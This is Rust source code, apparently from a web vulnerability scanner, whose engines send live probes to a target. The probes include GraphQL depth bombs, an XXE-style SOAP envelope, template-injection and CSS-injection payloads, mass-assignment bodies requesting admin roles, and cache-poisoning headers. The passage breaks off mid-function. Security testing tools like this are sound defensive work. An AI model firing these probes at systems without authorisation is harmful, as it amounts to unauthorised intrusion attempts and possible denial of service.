//! Advanced Web Engines — real HTTP/HTTPS probes against the target. No simulated findings.
//!
//! Each engine performs a focused live probe and only emits a finding when an observable
//! security-relevant signal is detected (header anomaly, response pattern, exposed endpoint).
//! On no signal: returns ok with empty findings.

use crate::engine_probes::{
    empty_ok, extract_host, finding, finding_with_probe_depth, has_header, header_value,
    http1_client, http2_client, http_client, http_get, http_get_with_headers,
    http_method_with_headers, http_post_json, join_url, normalize_url, probe_paths_concurrent,
    DEFAULT_PROBE_CONCURRENCY, HttpProbe,
};

const WEB_PROBE_DEPTH: &str = "web_app_surface";

fn web_finding(
    engine_id: &str,
    title: &str,
    severity: &str,
    mitre: &str,
    description: &str,
    target: &str,
) -> Value {
    finding_with_probe_depth(
        engine_id,
        title,
        severity,
        mitre,
        description,
        target,
        WEB_PROBE_DEPTH,
    )
}
use crate::engine_result::{print_result, EngineResult};
use serde_json::Value;

macro_rules! cli_wrapper {
    ($name:ident, $result_fn:ident) => {
        pub async fn $name(target: &str) {
            print_result($result_fn(target).await);
        }
    };
}

// ── graphql_deep_attack ───────────────────────────────────────────────────────
pub async fn run_graphql_deep_attack_result(target: &str) -> EngineResult {
    if target.trim().is_empty() {
        return EngineResult::error("target required");
    }
    let base = normalize_url(target);
    let client = http_client().await;
    let mut findings: Vec<Value> = Vec::new();
    let intro = serde_json::json!({"query":"{__schema{types{name fields{name}}}}"});
    let mutation_intro = serde_json::json!({"query":"{__schema{mutationType{name}}}"});
    let batch = serde_json::json!([{"query":"{__typename}"},{"query":"{__typename}"}]);
    let depth_bomb = serde_json::json!({"query":"{a{a{a{a{a{__typename}}}}}}"});
    let alias_bomb = serde_json::json!({"query":"{q1:__typename q2:__typename q3:__typename q4:__typename q5:__typename q6:__typename q7:__typename q8:__typename}"});
    let graphql_paths = [
        "/graphql",
        "/api/graphql",
        "/v1/graphql",
        "/query",
        "/api/v1/graphql",
        "/gql",
        "/api/gql",
    ];

    let path_probes = probe_paths_concurrent(&client, &base, &graphql_paths, DEFAULT_PROBE_CONCURRENCY).await;
    for p in path_probes {
        if p.status == 405 || p.status == 200 {
            if p.body.to_ascii_lowercase().contains("graphql") {
                findings.push(web_finding(
                    "graphql_deep_attack",
                    "GraphQL endpoint surface discovered",
                    "info",
                    "T1190",
                    &format!(
                        "{} ({}) advertises GraphQL — enumerate introspection, batching, and depth limits.",
                        p.final_url, p.status
                    ),
                    target,
                ));
            }
        }
    }

    for path in graphql_paths {
        let url = format!("{}{}", base.trim_end_matches('/'), path);
        if let Some(p) = http_post_json(&client, &url, &intro).await {
            if p.status < 500 && p.body.contains("__schema") && p.body.contains("types") {
                findings.push(web_finding(
                    "graphql_deep_attack",
                    "GraphQL introspection enabled",
                    "high",
                    "T1190",
                    &format!(
                        "GraphQL endpoint {} accepts __schema introspection (HTTP {}), exposing the full type graph to unauthenticated users.",
                        p.final_url, p.status
                    ),
                    target,
                ));
            }
        }
        // GET-based introspection (some servers allow query string transport)
        let get_intro = format!(
            "{url}?query={}",
            urlencoding::encode("{__schema{queryType{name}}}")
        );
        if let Some(p) = http_get(&client, &get_intro).await {
            if p.status < 500 && p.body.contains("__schema") {
                findings.push(web_finding(
                    "graphql_deep_attack",
                    "GraphQL introspection over GET",
                    "high",
                    "T1190",
                    &format!(
                        "GET introspection at {} (HTTP {}) — CSRF/log-based query exfiltration risk.",
                        p.final_url, p.status
                    ),
                    target,
                ));
            }
        }
        if let Some(p) = http_post_json(&client, &url, &mutation_intro).await {
            if p.status < 500 && p.body.contains("mutationType") {
                findings.push(web_finding(
                    "graphql_deep_attack",
                    "GraphQL mutation schema enumerable",
                    "medium",
                    "T1190",
                    &format!(
                        "Mutation root exposed via introspection at {} (HTTP {}).",
                        p.final_url, p.status
                    ),
                    target,
                ));
            }
        }
        if let Some(p) = http_post_json(&client, &url, &batch).await {
            if p.status >= 200 && p.status < 300 && p.body.trim_start().starts_with('[') {
                findings.push(web_finding(
                    "graphql_deep_attack",
                    "GraphQL batching accepted",
                    "medium",
                    "T1190",
                    &format!(
                        "Endpoint {} returned batched JSON array for multi-query POST — brute-force/DoS amplification risk.",
                        p.final_url
                    ),
                    target,
                ));
            }
        }
        if let Some(p) = http_post_json(&client, &url, &depth_bomb).await {
            let body_low = p.body.to_ascii_lowercase();
            if p.status < 500
                && !body_low.contains("max depth")
                && !body_low.contains("depth limit")
                && !body_low.contains("too complex")
                && p.body.contains("__typename")
            {
                findings.push(web_finding(
                    "graphql_deep_attack",
                    "Deep nested query accepted (no depth limit)",
                    "medium",
                    "T1499",
                    &format!(
                        "Nested depth query accepted at {} (HTTP {}) — DoS/recursion abuse possible.",
                        p.final_url, p.status
                    ),
                    target,
                ));
            }
        }
        if let Some(p) = http_post_json(&client, &url, &alias_bomb).await {
            if p.status < 500 && p.body.matches("__typename").count() >= 4 {
                findings.push(web_finding(
                    "graphql_deep_attack",
                    "Alias-heavy query accepted",
                    "low",
                    "T1499",
                    &format!(
                        "Alias fan-out query accepted at {} — cost-limit bypass candidate.",
                        p.final_url
                    ),
                    target,
                ));
            }
        }
    }
    if findings.is_empty() {
        empty_ok("graphql_deep_attack", target)
    } else {
        let n = findings.len();
        EngineResult::ok(
            findings,
            format!("graphql_deep_attack: {} live finding(s)", n),
        )
    }
}
cli_wrapper!(run_graphql_deep_attack, run_graphql_deep_attack_result);

// ── grpc_reflection_attack ────────────────────────────────────────────────────
pub async fn run_grpc_reflection_attack_result(target: &str) -> EngineResult {
    if target.trim().is_empty() {
        return EngineResult::error("target required");
    }
    let base = normalize_url(target);
    let client = http_client().await;
    let mut findings: Vec<Value> = Vec::new();
    let grpc_paths = [
        "/grpc.reflection.v1alpha.ServerReflection/ServerReflectionInfo",
        "/grpc.reflection.v1.ServerReflection/ServerReflectionInfo",
        "/grpc.health.v1.Health/Check",
        "/grpc.health.v1.Health/Watch",
        "/envoy.service.auth.v3.Authorization/Check",
    ];
    let grpc_headers = [
        ("Content-Type", "application/grpc"),
        ("TE", "trailers"),
    ];
    for path in grpc_paths {
        let url = format!("{}{}", base.trim_end_matches('/'), path);
        if let Some(p) = crate::engine_probes::http_post_json_with_headers(
            &client,
            &url,
            &serde_json::json!({}),
            &grpc_headers,
        )
        .await
        {
            let grpc_status = header_value(&p.headers, "grpc-status");
            let grpc_message = header_value(&p.headers, "grpc-message");
            if grpc_status.is_some() || grpc_message.is_some() {
                findings.push(web_finding(
                    "grpc_reflection_attack",
                    "gRPC endpoint responded with grpc-status headers",
                    "medium",
                    "T1190",
                    &format!(
                        "POST {} returned gRPC framing (grpc-status={:?}, grpc-message={:?}) — reflection/schema enumeration may be reachable over HTTP/2.",
                        p.final_url, grpc_status, grpc_message
                    ),
                    target,
                ));
            }
        }
    }

    // grpc-web transport (common behind API gateways)
    let web_paths = ["/grpc", "/api/grpc", "/grpc-web"];
    let probes = probe_paths_concurrent(&client, &base, &web_paths, DEFAULT_PROBE_CONCURRENCY).await;
    for p in probes {
        if p.status < 500 {
            let ct = header_value(&p.headers, "content-type").unwrap_or_default();
            if ct.contains("application/grpc-web") || p.body.contains("grpc-status") {
                findings.push(web_finding(
                    "grpc_reflection_attack",
                    "grpc-web transport detected",
                    "medium",
                    "T1190",
                    &format!(
                        "{} ({}) — grpc-web may expose services without mTLS; enumerate protobuf services.",
                        p.final_url, p.status
                    ),
                    target,
                ));
                break;
            }
        }
    }

    if findings.is_empty() {
        empty_ok("grpc_reflection_attack", target)
    } else {
        let n = findings.len();
        EngineResult::ok(findings, format!("grpc_reflection_attack: {} signal(s)", n))
    }
}
cli_wrapper!(
    run_grpc_reflection_attack,
    run_grpc_reflection_attack_result
);

/// Classify CORS misconfiguration from response headers and the Origin we sent (if any).
#[must_use]
fn cors_misconfiguration_signal(
    sent_origin: Option<&str>,
    acao: &str,
    allow_credentials: bool,
) -> Option<(&'static str, &'static str, &'static str)> {
    let acao = acao.trim();
    if acao.is_empty() {
        return None;
    }
    if acao == "*" {
        return Some((
            "CORS Allow-Origin: * observed",
            if allow_credentials { "high" } else { "medium" },
            "Wildcard ACAO — any origin may read responses",
        ));
    }
    if acao.contains("null") && allow_credentials {
        return Some((
            "CORS Allow-Origin: null with credentials",
            "high",
            "Origin=null with credentials=true — exploitable from sandboxed iframe",
        ));
    }
    if let Some(sent) = sent_origin {
        if acao == sent {
            return Some((
                "CORS reflects arbitrary Origin (credentialed cross-origin read)",
                if allow_credentials { "critical" } else { "high" },
                "Server echoes the request Origin in ACAO — attacker-controlled site can read authenticated responses",
            ));
        }
    }
    None
}

// ── cors_misconfiguration ─────────────────────────────────────────────────────
pub async fn run_cors_misconfiguration_result(target: &str) -> EngineResult {
    if target.trim().is_empty() {
        return EngineResult::error("target required");
    }
    let client = http_client().await;
    let url = normalize_url(target);
    let host = extract_host(target);
    let mut findings: Vec<Value> = Vec::new();
    let evil_origin = format!("https://weissman-cors-probe.{}", host);
    let origins: [Option<&str>; 3] = [
        None,
        Some(evil_origin.as_str()),
        Some("null"),
    ];
    for sent_origin in origins {
        let probe = if let Some(o) = sent_origin {
            http_get_with_headers(&client, &url, &[("Origin", o)]).await
        } else {
            http_get(&client, &url).await
        };
        let Some(p) = probe else { continue };
        let Some(acao) = header_value(&p.headers, "access-control-allow-origin") else {
            continue;
        };
        let creds = has_header(&p.headers, "access-control-allow-credentials");
        if let Some((title, severity, detail)) =
            cors_misconfiguration_signal(sent_origin, acao, creds)
        {
            findings.push(web_finding(
                "cors_misconfiguration",
                title,
                severity,
                "T1185",
                &format!(
                    "{} on {} (ACAO='{}', credentials={}, Origin sent={:?}).",
                    detail, p.final_url, acao, creds, sent_origin
                ),
                target,
            ));
            break;
        }
    }

    if let Some(p) = http_method_with_headers(
        &client,
        "OPTIONS",
        &url,
        None,
        &[
            ("Origin", evil_origin.as_str()),
            ("Access-Control-Request-Method", "POST"),
            ("Access-Control-Request-Headers", "Authorization, Content-Type"),
        ],
    )
    .await
    {
        let acao = header_value(&p.headers, "access-control-allow-origin").unwrap_or_default();
        let acam = header_value(&p.headers, "access-control-allow-methods").unwrap_or_default();
        if !acao.is_empty() && acam.contains("POST") {
            findings.push(web_finding(
                "cors_misconfiguration",
                "Preflight allows cross-origin POST",
                "high",
                "T1185",
                &format!(
                    "OPTIONS {} → ACAO='{acao}' ACAM='{acam}' — credentialed cross-site writes may be permitted.",
                    p.final_url
                ),
                target,
            ));
        }
    }
    if findings.is_empty() {
        empty_ok("cors_misconfiguration", target)
    } else {
        EngineResult::ok(
            findings.clone(),
            format!("cors_misconfiguration: {} finding(s)", findings.len()),
        )
    }
}
cli_wrapper!(run_cors_misconfiguration, run_cors_misconfiguration_result);

// ── http2_attack ──────────────────────────────────────────────────────────────
pub async fn run_http2_attack_result(target: &str) -> EngineResult {
    if target.trim().is_empty() {
        return EngineResult::error("target required");
    }
    let url = normalize_url(target);
    let h1 = http1_client().await;
    let h2 = http2_client().await;
    let mut findings: Vec<Value> = Vec::new();

    let (p1, p2) = tokio::join!(http_get(&h1, &url), http_get(&h2, &url));
    if let (Some(a), Some(b)) = (p1, p2) {
        let h1_server = header_value(&a.headers, "server").unwrap_or_default();
        let h2_server = header_value(&b.headers, "server").unwrap_or_default();
        if a.status != b.status || a.body.len().abs_diff(b.body.len()) > 64 {
            findings.push(web_finding(
                "http2_attack",
                "HTTP/1 vs HTTP/2 response differential",
                "medium",
                "T1190",
                &format!(
                    "H1→HTTP {} ({}B) vs H2→HTTP {} ({}B) on {} — protocol downgrade/smuggling review required.",
                    a.status, a.body.len(), b.status, b.body.len(), url
                ),
                target,
            ));
        }
        if h1_server != h2_server && (!h1_server.is_empty() || !h2_server.is_empty()) {
            findings.push(web_finding(
                "http2_attack",
                "Server fingerprint differs between HTTP/1 and HTTP/2",
                "medium",
                "T1190",
                &format!(
                    "H1 Server='{h1_server}' vs H2 Server='{h2_server}' — backend may be reachable on only one ALPN path."
                ),
                target,
            ));
        }
    }

    if let Some(p) = http_get(&h1, &url).await {
        let via = header_value(&p.headers, "alt-svc").unwrap_or_default();
        if via.contains("h3") || via.contains("h2") {
            findings.push(web_finding(
                "http2_attack",
                "Alt-Svc advertises modern HTTP stack",
                "info",
                "T1190",
                &format!("Alt-Svc='{via}' on {} — test h2c smuggling and cache poisoning on shared frontends.", p.final_url),
                target,
            ));
        }
    }

    // h2c upgrade smuggling signal — frontends that accept Connection: Upgrade
    if let Some(p) = http_get_with_headers(
        &h1,
        &url,
        &[
            ("Connection", "Upgrade, HTTP2-Settings"),
            ("Upgrade", "h2c"),
            ("HTTP2-Settings", "AAMAAABkAARAAAAAAAIAAAAA"),
        ],
    )
    .await
    {
        if p.status == 101
            || header_value(&p.headers, "upgrade").map(|u| u.contains("h2")).unwrap_or(false)
        {
            findings.push(web_finding(
                "http2_attack",
                "h2c Upgrade accepted (cleartext HTTP/2 risk)",
                "high",
                "T1190",
                &format!(
                    "GET {} with Upgrade:h2c returned HTTP {} — cleartext HTTP/2 may bypass TLS-only WAF rules.",
                    p.final_url, p.status
                ),
                target,
            ));
        }
    }

    if findings.is_empty() {
        empty_ok("http2_attack", target)
    } else {
        EngineResult::ok(
            findings.clone(),
            format!("http2_attack: {} live protocol finding(s)", findings.len()),
        )
    }
}
cli_wrapper!(run_http2_attack, run_http2_attack_result);

// ── swagger_abuse ─────────────────────────────────────────────────────────────
pub async fn run_swagger_abuse_result(target: &str) -> EngineResult {
    if target.trim().is_empty() {
        return EngineResult::error("target required");
    }
    let client = http_client().await;
    let base = normalize_url(target);
    let paths = [
        "/swagger.json",
        "/swagger/v1/swagger.json",
        "/v2/api-docs",
        "/v3/api-docs",
        "/openapi.json",
        "/api-docs",
        "/swagger-ui.html",
        "/swagger/index.html",
        "/api/swagger.json",
        "/api/openapi.json",
        "/docs/openapi.json",
        "/redoc",
        "/api/swagger-ui/",
    ];
    let mut findings: Vec<Value> = Vec::new();
    let probes = probe_paths_concurrent(&client, &base, &paths, DEFAULT_PROBE_CONCURRENCY).await;
    for p in probes {
        let body_low = p.body.to_ascii_lowercase();
        if p.status == 200
            && (body_low.contains("swagger")
                || body_low.contains("openapi")
                || body_low.contains("\"paths\""))
        {
            let has_auth = body_low.contains("securityschemes")
                || body_low.contains("bearer")
                || body_low.contains("oauth2");
            findings.push(web_finding(
                "swagger_abuse",
                "Exposed Swagger/OpenAPI spec",
                if has_auth { "medium" } else { "high" },
                "T1190",
                &format!(
                    "Public OpenAPI document at {} (HTTP {}) — leaks routes, params{}.",
                    p.final_url,
                    p.status,
                    if has_auth { ", and auth schemes" } else { "" }
                ),
                target,
            ));
            break;
        }
    }
    if findings.is_empty() {
        empty_ok("swagger_abuse", target)
    } else {
        EngineResult::ok(
            findings.clone(),
            format!("swagger_abuse: {} doc(s)", findings.len()),
        )
    }
}
cli_wrapper!(run_swagger_abuse, run_swagger_abuse_result);

// ── soap_injection ────────────────────────────────────────────────────────────
pub async fn run_soap_injection_result(target: &str) -> EngineResult {
    if target.trim().is_empty() {
        return EngineResult::error("target required");
    }
    let client = http_client().await;
    let base = normalize_url(target);
    let paths = [
        "/services?wsdl",
        "/ws?wsdl",
        "/soap?wsdl",
        "/axis2/services/listServices",
        "/service.asmx?WSDL",
        "/soap",
        "/ws",
    ];
    let mut findings: Vec<Value> = Vec::new();
    let probes = probe_paths_concurrent(&client, &base, &paths, DEFAULT_PROBE_CONCURRENCY).await;
    for p in probes {
        if p.status == 200 && (p.body.contains("<wsdl:") || p.body.contains("<definitions")) {
            findings.push(web_finding(
                "soap_injection",
                "Public SOAP/WSDL surface",
                "medium",
                "T1190",
                &format!(
                    "WSDL document accessible at {} (HTTP {}) — review parameters for XML/SOAP injection.",
                    p.final_url, p.status
                ),
                target,
            ));
            break;
        }
    }

    let xxe_envelope = r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe "weissman_xxe_probe">]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><probe>&xxe;</probe></soap:Body></soap:Envelope>"#;
    for path in ["/soap", "/ws", "/services", "/service.asmx"] {
        let url = format!("{}{}", base.trim_end_matches('/'), path);
        if let Some(p) = crate::engine_probes::http_post_bytes_with_headers(
            &client,
            &url,
            xxe_envelope.as_bytes(),
            &[
                ("Content-Type", "text/xml"),
                ("SOAPAction", "probe"),
            ],
        )
        .await
        {
            if p.body.contains("weissman_xxe_probe")
                || p.body.to_ascii_lowercase().contains("entity")
                || p.body.to_ascii_lowercase().contains("doctype")
            {
                findings.push(web_finding(
                    "soap_injection",
                    "SOAP endpoint may resolve external entities (XXE signal)",
                    "high",
                    "T1190",
                    &format!(
                        "POST {} returned XXE-related response (HTTP {}) — disable DTD/entity expansion.",
                        p.final_url, p.status
                    ),
                    target,
                ));
                break;
            }
        }
    }

    if findings.is_empty() {
        empty_ok("soap_injection", target)
    } else {
        EngineResult::ok(
            findings.clone(),
            format!("soap_injection: {} WSDL/signal(s)", findings.len()),
        )
    }
}
cli_wrapper!(run_soap_injection, run_soap_injection_result);

// ── odata_injection ───────────────────────────────────────────────────────────
pub async fn run_odata_injection_result(target: &str) -> EngineResult {
    if target.trim().is_empty() {
        return EngineResult::error("target required");
    }
    let client = http_client().await;
    let base = normalize_url(target);
    let mut findings: Vec<Value> = Vec::new();
    let meta_paths = [
        "/odata/$metadata",
        "/api/odata/$metadata",
        "/odata/v4/$metadata",
    ];
    for path in meta_paths {
        let url = format!("{}{}", base.trim_end_matches('/'), path);
        if let Some(p) = http_get(&client, &url).await {
            if p.status == 200 && (p.body.contains("<edmx:") || p.body.contains("EntityType")) {
                findings.push(web_finding(
                    "odata_injection",
                    "Exposed OData metadata",
                    "medium",
                    "T1190",
                    &format!(
                        "OData $metadata available at {} (HTTP {}) — enumerates entities and properties.",
                        p.final_url, p.status
                    ),
                    target,
                ));
            }
        }
    }

    let filter_probes = [
        "/odata/Users?$filter=1 eq 1",
        "/api/odata/Accounts?$filter='' eq ''",
        "/odata/v4/Products?$filter=true",
    ];
    let probes = probe_paths_concurrent(&client, &base, &filter_probes, DEFAULT_PROBE_CONCURRENCY).await;
    for p in probes {
        if p.status == 200
            && (p.body.contains("\"value\"")
                || p.body.contains("EntitySet")
                || p.body.contains("@odata.context"))
        {
            findings.push(web_finding(
                "odata_injection",
                "OData $filter accepted without auth gate",
                "high",
                "T1190",
                &format!(
                    "{} returned OData collection (HTTP {}) — injection/filter bypass may leak records.",
                    p.final_url, p.status
                ),
                target,
            ));
            break;
        }
    }

    if findings.is_empty() {
        empty_ok("odata_injection", target)
    } else {
        EngineResult::ok(
            findings.clone(),
            format!("odata_injection: {}", findings.len()),
        )
    }
}
cli_wrapper!(run_odata_injection, run_odata_injection_result);

// ── css_injection ─────────────────────────────────────────────────────────────
pub async fn run_css_injection_result(target: &str) -> EngineResult {
    if target.trim().is_empty() {
        return EngineResult::error("target required");
    }
    let client = http_client().await;
    let base = normalize_url(target);
    let mut findings: Vec<Value> = Vec::new();
    if let Some(p) = http_get(&client, &base).await {
        let csp = header_value(&p.headers, "content-security-policy").unwrap_or("");
        if css_injection_csp_weak(csp) {
            findings.push(web_finding(
                "css_injection",
                "Permissive style-src enables CSS injection",
                "medium",
                "T1185",
                &format!(
                    "CSP on {} = '{}'. Missing or 'unsafe-inline' style-src allows CSS-based data exfiltration.",
                    p.final_url, csp
                ),
                target,
            ));
        }
        if p.body.contains("@import") || p.body.contains("url(") {
            findings.push(web_finding(
                "css_injection",
                "Page embeds dynamic CSS import/url()",
                "low",
                "T1185",
                &format!(
                    "{} references @import/url() — attacker-controlled stylesheets can exfiltrate attribute values.",
                    p.final_url
                ),
                target,
            ));
        }
    }

    let css_payload = "weissman_css_probe%7bbackground%3aurl%28%2f%2fevil%2f%29%7d";
    for param in ["style", "css", "theme", "color", "q"] {
        let url = format!("{}/?{}={}", base.trim_end_matches('/'), param, css_payload);
        if let Some(p) = http_get(&client, &url).await {
            if p.body.contains("weissman_css_probe") || p.body.contains("url(/evil/)") {
                findings.push(web_finding(
                    "css_injection",
                    &format!("Reflected CSS in parameter '{param}'"),
                    "medium",
                    "T1185",
                    &format!(
                        "?{param}= on {} reflects attacker CSS — attribute-selector exfiltration possible.",
                        p.final_url
                    ),
                    target,
                ));
                break;
            }
        }
    }

    if findings.is_empty() {
        empty_ok("css_injection", target)
    } else {
        EngineResult::ok(
            findings.clone(),
            format!("css_injection: {}", findings.len()),
        )
    }
}
cli_wrapper!(run_css_injection, run_css_injection_result);

// ── template_injection_adv ────────────────────────────────────────────────────
pub async fn run_template_injection_adv_result(target: &str) -> EngineResult {
    if target.trim().is_empty() {
        return EngineResult::error("target required");
    }
    let client = http_client().await;
    let base = normalize_url(target);
    let mut findings: Vec<Value> = Vec::new();
    let payloads = [
        ("{{7*7}}", "49"),
        ("${7*7}", "49"),
        ("#{7*7}", "49"),
        ("<%= 7*7 %>", "49"),
        ("*{7*7}", "49"),
        ("${{7*7}}", "49"),
    ];
    let params = ["q", "search", "name", "template", "page"];
    'outer: for param in params {
        for (payload, expected) in payloads {
            let probe = format!(
                "{}/?{}={}",
                base.trim_end_matches('/'),
                param,
                urlencoding::encode(payload)
            );
            if let Some(p) = http_get(&client, &probe).await {
                if p.body.contains(expected) && !p.body.contains(payload) {
                    findings.push(web_finding(
                        "template_injection_adv",
                        "Server-side template evaluation confirmed",
                        "high",
                        "T1059",
                        &format!(
                            "Parameter '{}' on {} evaluated '{}' → '{}' without echoing the payload.",
                            param, p.final_url, payload, expected
                        ),
                        target,
                    ));
                    break 'outer;
                }
            }
        }
    }
    if findings.is_empty() {
        empty_ok("template_injection_adv", target)
    } else {
        EngineResult::ok(
            findings.clone(),
            format!("template_injection_adv: {}", findings.len()),
        )
    }
}
cli_wrapper!(
    run_template_injection_adv,
    run_template_injection_adv_result
);

// ── http_parameter_pollution ──────────────────────────────────────────────────
pub async fn run_http_parameter_pollution_result(target: &str) -> EngineResult {
    if target.trim().is_empty() {
        return EngineResult::error("target required");
    }
    let client = http_client().await;
    let base = normalize_url(target);
    let mut findings: Vec<Value> = Vec::new();

    let variants: [(&str, &str, &str); 4] = [
        ("duplicate_query", "?a=1", "?a=1&a=2&a=3"),
        ("semicolon", "?a=1;b=2", "?a=1;a=2;a=3"),
        ("bracket", "?a[]=1", "?a[]=1&a[]=2&a[]=3"),
        ("encoded_dup", "?a=1", "?a=1%26a=2"),
    ];
    for (label, single_q, polluted_q) in variants {
        let single = format!("{}{}", base.trim_end_matches('/'), single_q);
        let polluted = format!("{}{}", base.trim_end_matches('/'), polluted_q);
        if let (Some(p1), Some(p2)) = (
            http_get(&client, &single).await,
            http_get(&client, &polluted).await,
        ) {
            if p1.status != p2.status || (p1.body.len() as i64 - p2.body.len() as i64).abs() > 64 {
                findings.push(web_finding(
                    "http_parameter_pollution",
                    &format!("HPP differential ({label})"),
                    "medium",
                    "T1190",
                    &format!(
                        "{single_q} → HTTP {} ({} B); {polluted_q} → HTTP {} ({} B). Backend may concatenate or pick-last/first inconsistently.",
                        p1.status, p1.body.len(), p2.status, p2.body.len()
                    ),
                    target,
                ));
                break;
            }
        }
    }

    for path in ["/api/search", "/search", "/api/users"] {
        let url = format!("{}{}", base.trim_end_matches('/'), path);
        let payload = serde_json::json!({"role": "user", "role": "admin"});
        if let Some(p) = http_post_json(&client, &url, &payload).await {
            let body_low = p.body.to_ascii_lowercase();
            if body_low.contains("\"role\":\"admin\"") || body_low.contains("'role': 'admin'") {
                findings.push(web_finding(
                    "http_parameter_pollution",
                    "JSON duplicate key may elevate privilege field",
                    "high",
                    "T1190",
                    &format!(
                        "POST {} with duplicate JSON keys echoed admin role (HTTP {}).",
                        p.final_url, p.status
                    ),
                    target,
                ));
                break;
            }
        }
    }

    if findings.is_empty() {
        empty_ok("http_parameter_pollution", target)
    } else {
        EngineResult::ok(
            findings.clone(),
            format!("http_parameter_pollution: {}", findings.len()),
        )
    }
}
cli_wrapper!(
    run_http_parameter_pollution,
    run_http_parameter_pollution_result
);

// ── api_mass_assignment ───────────────────────────────────────────────────────
pub async fn run_api_mass_assignment_result(target: &str) -> EngineResult {
    if target.trim().is_empty() {
        return EngineResult::error("target required");
    }
    let client = http_client().await;
    let base = normalize_url(target);
    let mut findings: Vec<Value> = Vec::new();
    for path in [
        "/api/users",
        "/api/v1/users",
        "/api/account",
        "/users",
        "/account",
    ] {
        let url = format!("{}{}", base.trim_end_matches('/'), path);
        let payload = serde_json::json!({
            "is_admin": true,
            "role": "admin",
            "admin": true,
            "permissions": ["*"],
            "scope": "admin"
        });
        if let Some(p) = crate::engine_probes::http_post_json(&client, &url, &payload).await {
            let body_low = p.body.to_ascii_lowercase();
            if (200..300).contains(&p.status)
                && (body_low.contains("\"is_admin\":true")
                    || body_low.contains("\"role\":\"admin\"")
                    || body_low.contains("'is_admin': true"))
            {
                findings.push(finding(
                    "api_mass_assignment",
                    "Endpoint echoes privileged fields in response",
                    "high",
                    "T1548",
                    &format!(
                        "POST {} returned HTTP {} and response reflects privileged assignment fields — verify mass-assignment escalation.",
                        p.final_url, p.status
                    ),
                    target,
                ));
            }
        }
    }
    if findings.is_empty() {
        empty_ok("api_mass_assignment", target)
    } else {
        EngineResult::ok(
            findings.clone(),
            format!("api_mass_assignment: {}", findings.len()),
        )
    }
}
cli_wrapper!(run_api_mass_assignment, run_api_mass_assignment_result);

// ── web_cache_poison_adv ──────────────────────────────────────────────────────
pub async fn run_web_cache_poison_adv_result(target: &str) -> EngineResult {
    if target.trim().is_empty() {
        return EngineResult::error("target required");
    }
    let client = http_client().await;
    let url = normalize_url(target);
    let mut findings: Vec<Value> = Vec::new();
    let baseline = http_get(&client, &url).await;
    let base_body_len = baseline.as_ref().map(|p| p.body.len()).unwrap_or(0);
    let base_status = baseline.as_ref().map(|p| p.status).unwrap_or(0);

    if let Some(p) = baseline.as_ref() {
        let cache_status = header_value(&p.headers, "x-cache").unwrap_or_default();
        let cdn = header_value(&p.headers, "via").unwrap_or_default();
        let vary = header_value(&p.headers, "vary").unwrap_or_default();
        if (cache_status.contains("HIT") || cdn.contains("cloudfront") || cdn.contains("varnish"))
            && !vary.to_ascii_lowercase().contains("cookie")
            && !vary.to_ascii_lowercase().contains("authorization")
        {
            findings.push(web_finding(
                "web_cache_poison_adv",
                "CDN cache without per-user Vary",
                "medium",
                "T1185",
                &format!(
                    "x-cache='{cache_status}', via='{cdn}', vary='{vary}' on {} — unkeyed input may poison shared cache.",
                    p.final_url
                ),
                target,
            ));
        }
    }

    let poison_headers: &[(&str, &str)] = &[
        ("X-Forwarded-Host", "evil-cache-poison.test"),
        ("X-Forwarded-Scheme", "nothttps"),
        ("X-Original-URL", "/admin"),
        ("X-Rewrite-URL", "/internal"),
    ];
    for (hdr, val) in poison_headers {
        if let Some(p) = http_get_with_headers(&client, &url, &[(*hdr, *val)]).await {
            let reflected = p.body.contains(val)
                || p.body.contains("evil-cache-poison")
                || header_value(&p.headers, "location")
                    .map(|l| l.contains(val))
                    .unwrap_or(false);
            let size_delta = (p.body.len() as i64 - base_body_len as i64).unsigned_abs();
            if reflected || (p.status != base_status && size_delta > 128) {
                findings.push(web_finding(
                    "web_cache_poison_adv",
                    &format!("Unkeyed header {hdr} alters response"),
                    "high",
                    "T1185",
                    &format!(
                        "Baseline HTTP {base_status}({base_body_len}B) vs {hdr}={val}→HTTP {}({}B) on {} — cache poisoning / routing bypass candidate.",
                        p.status, p.body.len(), p.final_url
                    ),
                    target,
                ));
            }
        }
    }

    if findings.is_empty() {
        empty_ok("web_cache_poison_adv", target)
    } else {
        EngineResult::ok(
            findings.clone(),
            format!("web_cache_poison_adv: {}", findings.len()),
        )
    }
}
cli_wrapper!(run_web_cache_poison_adv, run_web_cache_poison_adv_result);

// ── clickjacking_engine ───────────────────────────────────────────────────────
pub async fn run_clickjacking_engine_result(target: &str) -> EngineResult {
    if target.trim().is_empty() {
        return EngineResult::error("target required");
    }
    let client = http_client().await;
    let base = normalize_url(target);
    let mut findings: Vec<Value> = Vec::new();

    let sensitive_paths = ["", "/login", "/signin", "/auth", "/account", "/checkout"];
    for path in sensitive_paths {
        let url = if path.is_empty() {
            base.clone()
        } else {
            format!("{}{}", base.trim_end_matches('/'), path)
        };
        if let Some(p) = http_get(&client, &url).await {
            let xfo = header_value(&p.headers, "x-frame-options").unwrap_or_default();
            let csp = header_value(&p.headers, "content-security-policy").unwrap_or_default();
            let csp_frame = csp.contains("frame-ancestors");
            let xfo_ok = xfo.eq_ignore_ascii_case("DENY")
                || xfo.eq_ignore_ascii_case("SAMEORIGIN")
                || csp.contains("frame-ancestors 'none'")
                || csp_frame;
            if !xfo_ok {
                let is_sensitive = !path.is_empty()
                    || p.body.to_ascii_lowercase().contains("password")
                    || p.body.to_ascii_lowercase().contains("login");
                findings.push(web_finding(
                    "clickjacking_engine",
                    if is_sensitive {
                        "Sensitive page lacks clickjacking defenses"
                    } else {
                        "No X-Frame-Options or frame-ancestors CSP"
                    },
                    if is_sensitive { "high" } else { "medium" },
                    "T1185",
                    &format!(
                        "{} can be iframed (XFO='{xfo}', frame-ancestors={csp_frame}).",
                        p.final_url
                    ),
                    target,
                ));
                break;
            }
        }
    }

    if findings.is_empty() {
        empty_ok("clickjacking_engine", target)
    } else {
        EngineResult::ok(
            findings.clone(),
            format!("clickjacking_engine: {}", findings.len()),
        )
    }
}
cli_wrapper!(run_clickjacking_engine, run_clickjacking_engine_result);

// ── subdomain_takeover ────────────────────────────────────────────────────────
pub async fn run_subdomain_takeover_result(target: &str) -> EngineResult {
    if target.trim().is_empty() {
        return EngineResult::error("target required");
    }
    let client = http_client().await;
    let url = normalize_url(target);
    let mut findings: Vec<Value> = Vec::new();
    if let Some(p) = http_get(&client, &url).await {
        let body_low = p.body.to_ascii_lowercase();
